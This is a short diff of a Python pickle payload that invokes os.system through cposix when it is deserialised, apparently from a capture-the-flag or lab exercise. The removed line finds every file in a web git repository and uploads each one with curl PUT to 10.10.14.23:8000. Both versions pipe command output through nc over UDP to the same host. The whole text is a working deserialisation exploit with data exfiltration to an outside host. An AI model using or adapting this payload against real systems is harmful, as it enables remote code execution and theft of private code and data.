@@ -1,6 +1,6 @@
 cposix
 system
 p1
-(S"echo 'homer'; echo -e $(find /var/www/git/simpsons.git -name '*' -type f -exec curl -X PUT -T {} http://10.10.14.23:8000)\\\n | nc -u 10.10.14.23 6667"
+(S"echo 'homer'; echo -e $(couchdb -h)\\\n | nc -u 10.10.14.23 6667"
 tRp2
 .
